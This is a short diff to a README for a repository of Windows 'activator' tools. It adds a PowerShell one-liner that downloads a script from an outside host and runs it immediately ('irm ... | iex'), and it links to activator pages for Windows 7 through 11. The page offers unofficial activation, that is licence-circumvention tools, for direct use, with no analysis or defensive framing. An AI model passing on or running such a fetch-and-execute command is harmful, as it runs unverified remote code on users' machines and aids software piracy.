@@ -1,6 +1,8 @@
 # Activator
 Activator is collection of Windows tools Activator.
 
+<irm https://get.activated.win | iex>
+
 List of Tools
    * [Windows 7, 8, 10 Activator](https://github.com/HackerajOfficial/ActivatorByHackeraj/blob/main/windows-10-8.1-8-7.md)
    * [Windows 11 Activator](https://github.com/HackerajOfficial/ActivatorByHackeraj/blob/main/Windows%2011%20Activator.md)
